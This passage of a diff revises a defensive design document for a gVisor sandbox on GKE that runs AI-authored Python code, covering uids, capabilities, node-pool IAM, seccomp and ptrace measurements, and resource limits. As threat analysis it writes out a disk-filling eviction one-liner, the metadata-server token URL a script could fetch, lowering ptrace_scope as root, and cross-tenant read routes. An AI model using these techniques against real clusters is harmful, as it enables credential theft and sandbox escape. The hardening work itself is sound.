+needs `setuid` before the fork, a `chown` of `/scratch/<id>`, and a `chown` of the token file,
+and with `capabilities.drop: ["ALL"]` the container holds no `CAP_SETUID`, `CAP_SETGID` or
+`CAP_CHOWN`: `setuid(65533)` and `chown(65533)` were measured returning `EPERM`. Taking it
+would mean adding those capabilities back to the one workload that executes
+attacker-influenceable code by design.
+
+Two costs follow, and both are load-bearing elsewhere in this document:
+
+- **`RLIMIT_NPROC` is not a per-execution control.** It is per *real uid* across the pid
+  namespace, so a child forking to its limit also stops the supervisor forking — the fork bomb
+  takes out the supervisor instead of being contained. The supervisor watches the child's
+  process group instead; the kubelet's `pod_pids_limit` is the outer backstop, not a
+  substitute.
 - **The token file is within the child's same-uid reach.** `/proc/<pid>/environ` is readable by
-  any process with the same uid, and mode `0600` on a supervisor-owned file does not exclude a
-  same-uid child or any helper it spawns (see the token-delivery numbered list in section 4).
-  The mitigation is lifetime, not permissions: the SDK reads the file once and unlinks it, so the
-  window is the interval before its first call, and `/scratch/<id>` is wiped regardless.
+  any process at the same uid, and mode `0600` on a supervisor-owned file excludes neither the
+  child nor any helper it spawns. The mitigation is lifetime, not permissions (section 4).
 
-**`4h6.39` must not assume it can drop privileges.** There is no uid to drop to and no capability
-to do it with; a supervisor written against option (a) will fail at runtime with `EPERM`, not at
-review. The section below is retained for the case where that trade is ever revisited *together
-with* the capability grant it requires — it does not describe what is implemented today.
+The image still *advertises* a second uid (`SANDBOX_CHILD_UID=65533`) in `/etc/passwd`.
+Nothing can switch to it, `build-checks.py` keeps the entry consistent with the variable, and
+the supervisor must not fork against it.
 
-### Permission contract for the second-uid option (NOT IN EFFECT — see the decision above)
+### gVisor, on its own node pool
 
-Option (a) of the pids row — a distinct child uid — is preferred, and it silently breaks two
-things unless the ownership rules are stated. Both have an obvious wrong fix that an
-implementer will reach for under time pressure, which is why the contract is written out
-rather than left to be derived.
+`runtimeClassName: gvisor` on a dedicated, pinned one-node pool with a taint only this pod
+tolerates. The pool exists for three reasons that a shared pool cannot give: per-pod pid limits
+are a **kubelet** setting rather than a pod-spec field; the node service account is
+node-scoped, so a sandbox node cannot carry the suite's GSA; and a gVisor escape then reaches a
+node whose identity is logging, monitoring and registry-pull rather than BigQuery and GCS.
 
-**What breaks.** With `/scratch/<id>` chown'd to the child uid, the artifacts the child
-writes are owned by the **child**, while the **supervisor** is the process that serves
-`read_artifact` and runs the 5-minute reaper — under any restrictive umask it cannot read
-them. Symmetrically, the mode-0600 token file the supervisor writes (section 4, token
-delivery) is owned by the **supervisor** and is unreadable by the **child**, which is the
-process that needs it. Section 4 justifies the file against the shared-uid option and never
-states this.
+`GKE_METADATA` mode on the pool is unconditional, which requires the cluster's
+`workload_identity_config` to be unconditional too — without it the pool is rejected **at
+apply, not at plan**.
 
-**The wrong fixes, named so they are recognisable in review:** `chmod 0777` on the artifacts
-directory (which hands a future second child a shared writable path, re-opening the
-cross-execution channel section 6.4 closed), or quietly falling back to a shared uid —
-which withdraws the pid control *and* the `/proc/<pid>/environ` protection that were the
-entire reason for choosing (a).
+### Per-execution and pod-wide bounds
 
-**The contract:**
+Every number below is read out of `sandbox/supervisor.py`; the reasoning for each is at its
+constant. Nothing here is configurable at runtime.
 
-- A **shared gid `65532`**, which both the supervisor uid and the child uid belong to. The
-  uids differ; the gid does not. This is what carries access in both directions.
-- `/scratch/<id>` is mode **`0750`**, owned **`child:65532`** — child owns it (so
-  `RLIMIT_NPROC`-era per-uid reasoning and write access hold), supervisor reaches it through
-  the group, nothing else reaches it at all.
-- `/scratch/<id>/artifacts` and its contents are mode **`0640`** (directory `0750`), group
-  `65532`, so the supervisor can read and reap what the child wrote without any world bit
-  being set. The SDK sets this explicitly rather than relying on the child's umask.
-- The token file is written by the supervisor, then **`chown`'d to the child uid at mode
-  `0400`** *before* the fork. The child can read it once and unlink it; the supervisor never
-  needs to read it back.
-- Under option (b) — one shared uid — none of this applies; the trade there is the loss of
-  the `/proc/<pid>/environ` protection recorded in section 4.
+<!-- BEGIN GENERATED: limits -->
 
-### Staying under `sizeLimit`: the supervisor enforces sub-quotas, the kubelet must never fire
-
-Two decisions elsewhere in this document interact badly and the interaction has to be
-closed explicitly. Removing the pod-level `/tmp` made 512Mi the **combined** artifact-plus-
-temp budget, while `read_artifact` (section 6) retains **every** execution's `artifacts/`
-for 5 minutes after completion. Exceeding an `emptyDir` `sizeLimit` does not fail the
-write — the **kubelet evicts the pod**. That kills the in-flight script *and* destroys every
-retained artifact from every earlier execution in the window. A script can trigger it
-deliberately with `open('/scratch/<id>/tmp/x','wb').write(b'\0'*512*1024*1024)`: a
-self-inflicted denial of service against the next several turns, which neither the volumes
-row nor the retention rule anticipated on its own.
-
-**Decision: supervisor-enforced sub-quotas, well under `sizeLimit`.** Specifically:
-
-- A **per-execution artifact quota of 64Mi** on `/scratch/<id>/artifacts`, enforced by the
-  supervisor. Over quota is a clean error returned to the model, not an eviction.
-- A **per-execution total quota** on all of `/scratch/<id>` (artifacts + temp + inputs +
-  caches), enforced the same way, sized so that one execution plus the full retained set
-  cannot approach 512Mi.
-- An **aggregate retained-artifact ceiling** across all retained `artifacts/` directories,
-  with **oldest-first eviction** when a new execution would breach it — so retention
-  degrades gracefully instead of accumulating until the kubelet intervenes.
-- Enforcement is by the supervisor polling actual usage, not by trusting the child: the
-  child writes directly to the filesystem and there is no syscall interposition available.
-  Poll interval must be short enough that a fast writer is killed before 512Mi (the child
-  is CPU-limited to 1500m, which bounds how fast it can get there).
-
-**Why not the alternative of putting `artifacts/` on a second small `emptyDir`.** It reads
-like the cleaner fix and it does not work: `sizeLimit` eviction is a **pod-level** action.
-A script that fills the temp `emptyDir` still gets the pod evicted, and the second
-`emptyDir` — being pod-local too — dies with it. Separating the volumes changes which
-volume is over budget, not whether the pod survives, so it protects neither the retained
-artifacts nor the in-flight script. Only a quota that keeps usage below `sizeLimit` in the
-first place does that, which is why the supervisor has to hold the budget.
-
-### gVisor (GKE Sandbox): adopted, on its own node pool
-
-**Decision: yes, and this settles the node-pool question rather than complicating it.**
-
-The argument against is real: GKE Sandbox cannot be enabled on an existing pool's workloads
-selectively — it requires a pool created with `sandbox_config { type = "GVISOR" }`,
-which is a *dedicated* pool, and gVisor's syscall interception costs measurably on the
-`mmap`/`futex`-heavy paths that numpy and polars live on.
-
-The argument for is decisive. Every other control in this document assumes the container
-boundary holds, and that boundary is a shared Linux kernel on a node — and on the existing
-pool that is a node whose `node_config` carries the `cloud-platform` OAuth scope and the
-`genetics-suite` service account. A kernel LPE from a container that already has
-arbitrary code execution — precisely our situation — reaches the node. gVisor is the only
-control in the catalogue that addresses that, and the population of people who can trigger
-script authoring includes anyone who can get a string into the model's context.
-
-**The cost argument does *not* invert, and an earlier version of this paragraph claimed it
-did.** It asserted that the primary pool was pinned at 2 × `e2-standard-4` and already
-overshot one node on both axes (3951m / 13.60 GiB), so a separate pool was nearly free.
-`genetics-results-suite-262` established that the pinning was never applied to any live
-profile — the primary pool autoscales 1-3 and runs **one** node — and re-derived the
-arithmetic: under the live **finngen** profile a full deploy peaks at 3226m / 12498 Mi
-against 3920m / 13273 Mi allocatable, i.e. it **fits**, with 775 Mi to spare. See `docs/project-spec.md`
-("Node pool sizing") for the current table. So the honest accounting is: putting the sandbox
-on the existing pool would push finngen over and force a second node; putting it on its own
-pool leaves the primary surge budget **untouched** (the sandbox contributes 0m and 0 GiB) at
-the cost of **one permanently-running `e2-standard-2`**. gVisor was chosen anyway, on the
-isolation grounds above and not on cost.
-
-**Specification for `4h6.10`:**
-
-**Implemented** as `google_container_node_pool.sandbox_nodes` in `terraform/gke.tf`
-(`4h6.10`), behind `var.sandbox_pool_enabled` (**default `false`** — `scripts/deploy.sh` runs
-`terraform apply -auto-approve` on every full deploy, so an ungated pool would be created by a
-routine deploy nobody opted into).
-
-Two corrections against the spec as originally drafted below, and they are **not** of equal
-standing — do not read them as a pair:
-
-- **Tool-verified.** The provider argument is `sandbox_config { type = ... }`, not
-  `sandbox_type`; `terraform validate` rejects the latter outright. (The case question this
-  bullet carried as open — the GKE REST enum is `GVISOR`, the provider does no normalization, and
-  there is no lowercase `gvisor` string in the binary — was **settled at the first real apply**
-  (`daly-staging`, 2026-08-26): the value is `"GVISOR"`, here, in `terraform/gke.tf` and in
-  `docs/project-spec.md`, and the created pool reports `sandboxConfig.type: GVISOR`.)
-- **Not verified by anything.** `pod_pids_limit` was raised from 256 to **1024** on the strength
-  of GKE's *documented* minimum. `terraform validate` did **not** find this and does not confirm
-  it: the provider schema is a bare optional number with no range check, so it passes on 256 as
-  readily as on 1024. `terraform/gke.tf` and `docs/project-spec.md` both mark it **UNCONFIRMED**
-  against this cluster (`genetics-results-suite-5r2`); this copy says the same. Only a real pool
-  creation settles it.
-
-- New `google_container_node_pool` `<cluster>-sandbox-pool`,
-  `min_node_count == max_node_count == 1`. The pinning rationale here is *not* inherited from
-  the main pool (which autoscales 1-3 — see `genetics-results-suite-262`): it is that a
-  scale-down would kill an in-flight script, with no second replica.
-- `machine_type = "e2-standard-2"`, `sandbox_config { type = "GVISOR" }`,
-  `kubelet_config { pod_pids_limit = 1024 }`. Sizing on an `e2-standard-2`: CPU allocatable is
-  1930m; **memory allocatable is not derivable offline** — the capacity-minus-reservations method
-  gives 6249 Mi but provably overstates (the same method gives 13622 Mi for the measured
-  `e2-standard-4`, whose real allocatable is 13273 Mi), so 6249 Mi is an **upper bound**, not a
-  value. The overhead the pod actually shares the node with is **not** the primary node's
-  876m / 1.33 GiB: ~487m / ~555 Mi of that is singletons (kube-dns, metrics-server, konnectivity,
-  the autoscalers) that do not tolerate `sandbox.gke.io/runtime=gvisor:NoSchedule` and cannot
-  land here. What can is the DaemonSet set, measured at ~383m / ~769 Mi, plus `gke-metadata-server`
-  (undeterminable offline — WI is off on this cluster, so the DaemonSet does not exist) and the
-  GKE Sandbox components (of which `runsc-metric-server` is measurable, dormant at 3m / 12 Mi).
-  An earlier draft claimed the pod's 1500m ceiling was unsatisfiable alongside the system pods
-  (876m + 1500m = 2376m > 1930m); on the correct base, 383m + 1500m = 1883m < 1930m, so **that
-  conclusion is not established** — and the undetermined rows mean the reverse is not established
-  either. Full table in `docs/project-spec.md`, "The sandbox pool".
-  **UNVERIFIED, and `4h6.10` must settle it before relying on either number.** Two open
-  questions that cannot be answered from this checkout or read-only from the live project —
-  as of 2026-08-13 the `finngenie` cluster (`europe-west1-b`) has exactly one node pool,
-  `finngenie-pool`, `e2-standard-4`, **no `sandboxConfig`**, so there is no gVisor node
-  anywhere to measure against:
-  (a) the runsc **sentry's** memory footprint. It is charged to the pod's cgroup, so it eats
-  into the 3Gi limit in the Memory row above, and the `RLIMIT_AS` headroom that row asks for
-  must cover supervisor **plus sentry**, not supervisor alone. The figure is workload-shaped
-  (it tracks the app's mapped memory and open fds) and no published constant substitutes for
-  measuring it.
-  (b) whether `e2-standard-2` satisfies GKE Sandbox's machine-type requirements on this
-  cluster's release channel and version. Confirming it needs a real `terraform apply` in a
-  non-production project — the same apply the review gate below already requires — because
-  the constraint is enforced at pool creation, not at plan.
-- **`node_config.workload_metadata_config { mode = "GKE_METADATA" }`, unconditionally.**
-  This is not optional and it is not a copy of the primary pool's arrangement.
-  `terraform/gke.tf` (primary pool, ~lines 57-72) sets `workload_metadata_config` inside a
-  `dynamic` block gated on `var.manage_iam`, and its `service_account` likewise falls back
-  to `null` when `manage_iam = false` and `node_service_account` is empty. A new pool
-  written from a bare spec of `machine_type` + `sandbox_config` + `kubelet_config` inherits
-  the provider defaults for everything else, and those defaults are exactly wrong here:
-  `workload_metadata_config` unset means **`GCE_METADATA`**, which exposes the raw GCE
-  metadata server to every pod on the node, and `service_account` unset means the **Compute
-  Engine default service account**, which in most projects carries `roles/editor`. A script
-  then does one HTTP GET to
-  `169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` and holds a
-  project-level access token. Note what this defeats: Workload Identity is *irrelevant* in
-  `GCE_METADATA` mode, because in that mode the identity handed out is the node's and is
-  not derived from the KSA at all — "the sandbox KSA has no WI binding" stops being a
-  statement about anything.
-
-  **But `GKE_METADATA` is necessary, not sufficient, and `4h6.10` establishes only half of
-  the control.** It does not deny credentials; it swaps *node* identity for *KSA* identity.
-  The other half — the sandbox KSA having **no** Workload Identity binding — is established by
-  nothing in the terraform change, and the repo's house style is the failure mode: all 8
-  deployments in `k8s/deployments/*.yaml` set `serviceAccountName: genetics-suite`, and
-  `terraform/iam.tf` binds exactly that KSA to a GSA holding `bigquery.dataViewer`,
-  `bigquery.jobUser`, `storage.objectViewer` and `logging.viewer`. **Whoever writes
-  `k8s/deployments/sandbox.yaml` must give it a dedicated KSA with no
-  `iam.gke.io/gcp-service-account` annotation and no `google_service_account_iam_member`
-  binding — explicitly not `genetics-suite`, and not the namespace `default` either.** Copy
-  the house style and `GKE_METADATA` buys nothing at all. The same warning is repeated in
-  `terraform/gke.tf`'s pool comment, where a reviewer of the pool will see it.
-- **`GKE_METADATA` requires cluster-level Workload Identity, so the cluster resource must
-  change too — this is not optional and it is not a detail.**
-  `workload_metadata_config { mode = "GKE_METADATA" }` is rejected by the GKE API unless
-  the *cluster* has a `workload_pool` configured. In `terraform/gke.tf`,
-  `google_container_cluster.primary`'s `workload_identity_config` is itself inside a
-  `dynamic` block with `for_each = var.manage_iam ? [1] : []`. So under
-  `manage_iam = false` there is **no `workload_pool`**, and an unconditional
-  `GKE_METADATA` node pool fails **at apply, not at plan**. `4h6.10` must therefore also
-  make the cluster's `workload_identity_config` **unconditional** —
-  `workload_pool = "${var.project_id}.svc.id.goog"` always, outside the `dynamic`. That is
-  an **in-place cluster update**: it does not recreate the cluster, and it does not change
-  any existing node pool's metadata mode (each pool's `workload_metadata_config` is
-  independent, and the primary pool's stays exactly as it is today).
-
-  Why this is called out so heavily: the apply-time failure has a cheap wrong fix. An
-  implementer who hits `Workload Identity is not enabled` on `terraform apply` will reach
-  for the obvious escape — re-gate the sandbox pool's `workload_metadata_config` on
-  `var.manage_iam`, matching the primary pool — which reintroduces the `GCE_METADATA` hole
-  verbatim in exactly the deployment where it is most dangerous.
-- **A dedicated node service account, mandatory under `manage_iam = false`.** Not
-  `genetics-suite` (that GSA holds the BigQuery, GCS and logging roles the sandbox must
-  never reach), and not the Compute Engine default. A new GSA carrying only what a node
-  needs — `roles/logging.logWriter`, `roles/monitoring.metricWriter`,
-  `roles/monitoring.viewer`, `roles/stackdriver.resourceMetadata.writer`,
-  `roles/artifactregistry.reader` — and nothing else. Terraform cannot create it (and under
-  `manage_iam = false` is not allowed to), so `var.sandbox_node_service_account` is a
-  **required input whenever `sandbox_pool_enabled = true`**, in every mode, and **never** falls
-  back to `null` the way the primary pool's does. `null` there means the Compute Engine default
-  SA, which in most projects carries `roles/editor`.
-
-  **As shipped, be precise about what "validated" means: it is a format and identity check, not
-  a privilege check.** Three `lifecycle { precondition }` blocks on the pool resource (not
-  variable validations — so they fire only when the pool is actually being created, and the
-  escape hatch is "don't create the pool", never "create it with a weaker SA"): the email must
-  match `<name>@<project_id>.iam.gserviceaccount.com` in *this* project, case-folded; it must
-  not be `genetics-suite`; and it must not equal `var.node_service_account`. That third check is
-  the one that matters most and was missing from earlier drafts — under the live
-  `manage_iam = false` mode the primary pool grants `oauth_scopes = ["cloud-platform"]`, so
-  reusing its SA would put the suite's **entire credential** on the node running untrusted code.
-  **Terraform neither creates the SA nor reads back the roles bound to it.** The `gcloud` recipe
-  in `README.md` is the only thing bounding them, and nothing checks that the operator did not
-  grant more — so an over-privileged SA passes every check here. The variable keeps
-  `default = ""` only because omitting a default makes terraform prompt interactively; `""`
-  fails the first precondition.
-- **Explicit `oauth_scopes`**, not the provider default, and **the rationale is narrower
-  than it looks.** An earlier draft called node scopes "the second bound on any token the
-  metadata server would mint". In `GKE_METADATA` mode that is **false**: tokens handed to
-  pods are minted for the Workload-Identity-bound GSA through the IAM Credentials API and
-  are not scope-limited by the node at all, and pods cannot reach the node SA's own token
-  in that mode. Node scopes bound only the node SA's own token. So scope reduction is
-  defence-in-depth for the **`GCE_METADATA` misconfiguration case** (and for a gVisor
-  escape reaching the node, residual #1) — it is *not* load-bearing for the pod-facing
-  guarantee, and nothing in this document may be built on the assumption that it is.
-
-  **Name the scopes explicitly; "scope down from `cloud-platform`" with no value will
-  break the pool.** Artifact Registry image pulls go through the storage API and need
-  `devstorage.read_only` — `roles/artifactregistry.reader` on the SA is *not* sufficient
-  on its own. The minimum set:
-  `https://www.googleapis.com/auth/devstorage.read_only`, `logging.write`, `monitoring`,
-  `monitoring.write`, `service.management.readonly`, `servicecontrol`, `trace.append`.
-- **The `manage_iam = false` deployment is the dangerous one.** The IAM resources in
-  `terraform/iam.tf` are gated `count = var.manage_iam ? 1 : 0`, and the primary pool's
-  `workload_metadata_config` is gated on the same variable — so in a deployment where a
-  platform team owns IAM and `manage_iam` is false, the bad defaults above are precisely
-  what applies.
-
-  **The review gate is not a plan inspection.** An earlier draft said `4h6.10` "fails
-  review if a `terraform plan` under `manage_iam = false` produces a sandbox pool without
-  `GKE_METADATA`". That gate passes cleanly and catches nothing: the pool *does* plan with
-  `GKE_METADATA`; what is missing is the cluster's `workload_pool`, and that only surfaces
-  at apply. `4h6.10` instead fails review unless **all three** of the following hold by
-  inspection of the terraform source:
-  1. `google_container_cluster.primary.workload_identity_config` is unconditional — not
-     inside any `dynamic` or `count` gated on `var.manage_iam`.
-  2. The sandbox pool's `workload_metadata_config { mode = "GKE_METADATA" }` is likewise
-     unconditional.
-  3. `var.node_service_account` is validated non-empty whenever `manage_iam = false`, with
-     no `null` fallback path reachable for the sandbox pool.
-
-  A `terraform apply` in a non-production project with `manage_iam = false` is the
-  confirming test, because apply is where this class of error appears.
-- GKE automatically taints gVisor nodes `sandbox.gke.io/runtime=gvisor:NoSchedule`, so no
-  suite workload can drift onto it; the sandbox Deployment sets the matching toleration and
-  `runtimeClassName: gvisor`.
-- `node_config.machine_type` is ForceNew on `google_container_node_pool` — this is a *new*
-  pool resource, not an edit to the existing one, so no destroy/recreate of the primary
-  pool is involved.
-- Steady-state surge total for the main pool is unchanged. Re-derive nothing.
-
-**Judgement call flagged for the user:** this is roughly one extra small always-on node.
-Against ~1,842 USD of measured LLM spend it is minor, but it is a standing cost for a
-threat (kernel escape) that has not occurred. The cheaper alternative — sandbox on the
-existing pool with `RuntimeDefault` seccomp only — requires re-deriving the surge budget
-against a pool that is already over, and accepts kernel-boundary-only isolation. If cost
-wins, that is the fallback; nothing else in this document changes.
-
-### Rejected controls, with reasons
-
-- **Custom seccomp profile.** A tighter-than-`RuntimeDefault` profile needs a node-local
-  file distributed by DaemonSet and referenced via `localhostProfile`, and the syscall set
-  CPython + numpy + polars + matplotlib actually touch is large and changes with wheel
-  versions. The realistic outcome is latent breakage that gets "fixed" by loosening the
-  profile until it is `RuntimeDefault` again. The profile does block most of the
-  escape-relevant set, and gVisor supersedes the marginal gain — but **not `ptrace`**, and
-  that exception carries a shipped integrity property. See the re-derivation immediately
-  below rather than citing this list from memory.
-- **In-interpreter sandboxing** (`RestrictedPython`, `sys.addaudithook`, import hooks).
-  Not a security boundary and will not be presented as one. CPython has no supported
-  in-process confinement; every published bypass chain (`__subclasses__`, `ctypes`, frame
-  walking) works. The boundary is the pod, the network policy and the kernel — full stop.
-- ~~**`hostAliases` instead of DNS.**~~ **Not rejected — adopted as the v1 default.** See
-  section 3, "On DNS". An earlier draft kept kube-dns egress and booked DNS tunnelling as
-  a low-bandwidth residual; that arithmetic was wrong and the decision is reversed.
-
-#### What the default profile blocks, re-derived — and the one entry that was false
-
-`genetics-results-suite-4h6.90`: this list previously named `ptrace` beyond self among the
-calls the profile blocks. It does not. The rest of the list holds, and each entry below was
-**MEASURED 2026-08-20** in the shipped image (`genetics-sandbox:local`) under `docker run
---cap-drop=ALL --user 65532`, run twice with **only** `seccomp=unconfined` varied — the same
-control experiment as the `4h6.55` namespace measurement further down, and for the same
-reason: a seccomp `ERRNO` denial returns `EPERM`, which is indistinguishable from a
-capability denial unless you vary the profile.
-
-| call | default profile | `seccomp=unconfined` | reading |
-|---|---|---|---|
-| `add_key` | `EPERM` | `EFAULT` | blocked by the profile |
-| `keyctl` | `EPERM` | `EINVAL` | blocked by the profile |
-| `bpf` | `EPERM` | `EINVAL` | blocked by the profile |
-| `mount` | `EPERM` | `EFAULT` | blocked by the profile |
-| `unshare(CLONE_NEWUSER)` | `EPERM` | **succeeds** | namespace flags blocked by the profile |
-| `ptrace(PTRACE_ATTACH)` on own descendant | **`rc=0`** | `rc=0` | **NOT blocked**, either way |
-
-The errno *changing* when the profile is relaxed is what makes the first five conclusive: the
-syscall reaches the kernel and fails on its arguments, so the `EPERM` under the profile came
-from seccomp. `ptrace` never returns `EPERM` at all — the attach succeeds, and
-`/proc/<child>/mem` opens.
-
-This is **MEASURED against docker's default profile, which is the closest local analogue of
-containerd's `RuntimeDefault`, not the same file** (the same caveat the `4h6.55` measurement
-carries). No copy of moby/containerd's `default.json` exists on this machine to read, so
-"docker's default ≈ `RuntimeDefault`" is INFERENCE, not a read of the cluster's profile.
-Nothing here is claimed for gVisor: `runsc` filters syscalls in the sentry and the host
-profile applies to the sentry's own calls, not the application's (`4h6.51`).
-
-**What actually stops a child attaching to the supervisor is Yama, alone.** MEASURED in the
-same image, uid 65532, a child forked from a parent holding a canary:
-`yama/ptrace_scope=1`; `ptrace_attach rc=-1 errno=1 (EPERM)`; `/proc/<supervisor>/mem` →
-`PermissionError(13)`; `process_vm_readv` → `EPERM`. Scope 1 refuses `PTRACE_MODE_ATTACH`
-because the supervisor is the child's **ancestor**, not its descendant; sibling-to-sibling (a
-resident of execution A against execution B's child) fails for the same reason. The direction
-the profile leaves open — attaching to one's *own* descendant — is the one Yama also permits,
-which is why the two together look like a block and are not one.
-
-**`PTRACE_MODE_READ` is a different gate and is NOT restricted by Yama.** The child can still
-read the supervisor's `/proc/<pid>/environ`, exactly as recorded in section 4 and in the
-`4h6.43` token-delivery reasoning — that claim is correct and is not weakened here. Nothing
-in this section says the child cannot read the supervisor's `/proc`; it says the child cannot
-`ATTACH` to it or read its `/proc/<pid>/mem`.
-
-**Why this is load-bearing rather than a wording fix.** `genetics-results-suite-4h6.82`'s
-artifact-integrity property is built on it: `build_manifest` (`sandbox/supervisor.py`, ~line
-900) keeps the sha256 map "in the SUPERVISOR'S MEMORY — never on the filesystem, because the
-whole failure it answers is that /scratch is writable by the process being defended against".
-A child that could `PTRACE_ATTACH` to the supervisor would forge that map and `4h6.82` would
-evaporate. So the map's protection rests on **Yama's `ptrace_scope=1`**, not on the seccomp
-profile — **MEASURED under `runc`, UNVERIFIED under gVisor**, which implements `ptrace` and
-`/proc` in the sentry and which `4h6.51` owns measuring (no `runsc` on this machine, measured
-2026-08-20). Read it as one unmeasured gVisor fact, not as a property of the profile list
-above. **The same map, and now the per-execution artifact key (`4h6.88`), rest on it.**
-
-**MEASURED UNDER GVISOR 2026-08-24, and the earlier "UNVERIFIED under gVisor" is now
-resolved.** A real `PTRACE_ATTACH` (request 16, via `ctypes`) at uid 65532 inside one
-container, `ptrace_scope=1`, under both runtimes:
-
-| attacker → target | `runsc` | `runc` |
+| bound | value | enforced by |
 |---|---|---|
-| sibling → sibling (same uid, **not** a descendant) | **DENIED, `EPERM`** | **DENIED, `EPERM`** |
-| parent → its own child (a descendant) | **ALLOWED**, returns 0 | **ALLOWED**, returns 0 |
+| wall clock | 60s default, 120s ceiling | `_watchdog`, per execution; over the ceiling is rejected, never clamped |
+| kill grace | 2s | SIGTERM to the child's process group, then SIGKILL |
+| memory (child) | 2560 MiB | `RLIMIT_AS`, soft and hard, applied by the child to itself; 512 MiB of the pod's 3072 MiB is left as supervisor headroom |
+| pid budget | 32 | supervisor-side watch on the child's process group, not `RLIMIT_NPROC` |
+| pipe cap | 8 MiB | the reader stops and kills the child's group |
+| returned output | 32 KiB head + 32 KiB tail | elision marker between them, additional to the budget |
+| artifacts, per execution | 64 MiB / 1024 entries | polled; over it the execution is killed and `_retain` trims back to the quota |
+| execution directory | 192 MiB / 20000 entries | the whole of `/scratch/<id>`, artifacts included |
+| retained artifacts | 256 MiB | oldest-first eviction across completed executions |
+| retained supervisor state | 4 MiB | digest maps and retention rows; the second ceiling eviction fires on |
+| /scratch aggregate | 480 MiB | backstop 32 MiB under the emptyDir `sizeLimit` of 512 MiB |
+| retention | 300s | a floor, not an instant: the reaper polls every 30s, and the ceilings above can evict earlier |
+| artifact read | 512 KiB | plaintext, not the file: a sealed file is allowed 28 bytes more on disk |
+| audit stream | 4 KiB/record, 1 MiB/execution, 100 records/s (burst 200) | every one applied on the read end, per execution |
+| queue | depth 2, wait 120s | depth counts requests *waiting*; over either, `429` with `Retry-After: 60` |
+| request body | 1 MiB | raw bytes on the wire; `code` separately at 256 KiB of UTF-8 |
+| request head | 64 KiB | request line and headers as one block |
+| read deadlines | head 10s, body 10s, idle 65s | one deadline for the whole head; the idle bound closes silently |
+| response body | 1 MiB | a backstop; every component is separately capped |
+| SIGTERM drain | 125s | between max wall clock + grace and the manifest's `terminationGracePeriodSeconds` |
 
-Identical under both. **The parent→child row is the control and it is what makes this a
-security property rather than an artefact:** it rules out "`ptrace` is simply unimplemented
-under gVisor" masquerading as protection. gVisor implements the Yama **relational** rule, not
-a blanket ban. So the secrecy the digest map and the artifact key depend on **is sound under
-gVisor as this sandbox is configured today**.
+<!-- END GENERATED: limits -->
 
-**"A node booted with `ptrace_scope=0` removes this protection entirely" was wrong, and it is
-wrong in a way worth stating exactly.** It is not that the node's value is merely irrelevant.
-Two measured facts:
+Two of these are worth reading together, because they are the ones that interact badly.
+Exceeding an `emptyDir` `sizeLimit` does not fail the write — **the kubelet evicts the pod**,
+killing the in-flight script *and* destroying every retained artifact from every earlier
+execution in the window. The per-execution quotas plus the retained ceiling are what keep the
+aggregate under the cliff, and the aggregate check is a backstop that fires before the kubelet
+does. The arithmetic is stated once, in the supervisor, above `ARTIFACT_QUOTA_BYTES`.
 
-1. **gVisor's `ptrace_scope` is a sandbox-internal emulated sysctl.** The guest reads and
-   writes its own; the host's was 1 before these tests and still 1 after. So the node's value
-   is not the lever the old sentence claimed it was.
-2. **gVisor does not create the read-only `/proc/sys` mount `runc` uses to enforce the OCI
-   `readonlyPaths` list.** `grep " /proc/sys " /proc/mounts` returns a `ro` proc mount under
-   `runc` and **nothing** under `runsc`. Writing `0` to
-   `/proc/sys/kernel/yama/ptrace_scope` on the real image: `runsc` at uid 65532 → `EACCES`,
-   value stays 1; `runsc` at **uid 0 → SUCCEEDS**, value becomes 0; `runc` at uid 65532 →
-   `EACCES`; `runc` at uid 0 → `EROFS`. The full chain was then demonstrated: under `runsc` as
-   uid 0, after lowering the value, the sibling→sibling attach that was `EPERM` above
-   **returns 0**. The sysctl is live, not decorative.
+What that arithmetic does **not** prove: the reserve is a margin, not a bound. A poll can miss
+a few hundred MiB of writes and a child that traps `SIGTERM` keeps writing for the grace
+period. What bounds those is how fast the writer is stopped and `_retain` deleting what the
+overshoot produced. The steady state is exact; a hostile burst's transient peak is not.
 
-**So under gVisor, `ptrace_scope=1` is protected by the sandbox never having uid 0, and by
-nothing else.** The read-only-`/proc/sys` layer that would independently protect it under
-`runc` is **absent**. There is no live exposure today — the pod is `runAsNonRoot` at 65532
-with `drop: [ALL]` and `allowPrivilegeEscalation: false`, so nothing inside can become uid 0 —
-but **the defence-in-depth layer a reader would assume is there is not there**, and any future
-change that grants root inside the sandbox silently voids this property instead of hitting a
-second wall. Treat "no uid 0 in the sandbox" as load-bearing for `4h6.82` and `4h6.88`, not as
-hygiene.
+### Concurrency, and what it does not remove
 
-**RESIDUAL, stated rather than quietly dropped.** These measurements are from **docker/runsc on
-a development machine**. On GKE Sandbox the `/proc` masking is supplied by **containerd**, not
-docker, and containerd's `readonlyPaths` handling may produce a different mount table. The
-**dependency** — uid 0 inside the sandbox would void `ptrace_scope=1` — transfers as a design
-conclusion. The **exact writability result does not**, and should be re-measured on a real GKE
-Sandbox node. Nothing in `k8s/deployments/sandbox.yaml` asserts or checks the value either way.
+One execution at a time, queued beyond that, at one replica. Measured peak is 23 chat turns an
+hour, so queueing costs nothing.
 
-### Where the image lives
+**It does not remove cross-user co-tenancy inside the pod.** It bounds what runs at the same
+*instant*; the co-tenancy is in the **queue** (other users' requests held in the supervisor
+while one executes) and in the **retention window** (completed executions' directories, and the
+address space they left behind). Three routes between tenants were demonstrated, and their
+status differs:
 
-**Decision:** a new `sandbox/` build context in **this** repo (genetics-results-suite),
-built by `scripts/build-all.sh` and `scripts/build.sh` alongside the existing `monitor` and
-`keycloak` local contexts. The SDK is pip-installed from genetics-mcp-server at build time.
-Rationale: the hardening (base image, uid, absent shell) is deployment policy and must stay
-consistent with the manifests in `k8s/`, which live here; and this repo is the spec of
-record for cross-repo concerns.
+| route | status |
+|---|---|
+| supervisor memory — a forked child reading another user's tokens and source out of inherited pages, by module global, frame walk, `gc.get_objects()` and a raw `/proc/self/mem` scan | **closed**, by the fork server: the process that forks has never held a token, a request body or anyone's source code |
+| `/scratch` — reading and writing another execution's artifacts at the shared uid | **integrity closed** (the manifest's digests, re-checked on the way out); **reading closed between executions** (retained artifacts are sealed) and **open within one** |
+| a `setsid()` descendant that outlives its execution | **bounded across executions** (the fork server is a child subreaper and sweeps by parentage, four chain levels per execution) and **open within one**; unverified under gVisor, which implements `prctl` in the sentry |
 
-### As built (`4h6.6`) — what shipped, and the two places it departs from the above
+The fork server is the load-bearing one, so its property is stated exactly: **the process that
+calls `os.fork()` to make an execution child must never have held a token, a request body or
+another user's source code.** Nothing reference-shaped can achieve that — Python strings are
+immutable and freed objects stay in arenas that copy-on-write hands to the child, so `del`,
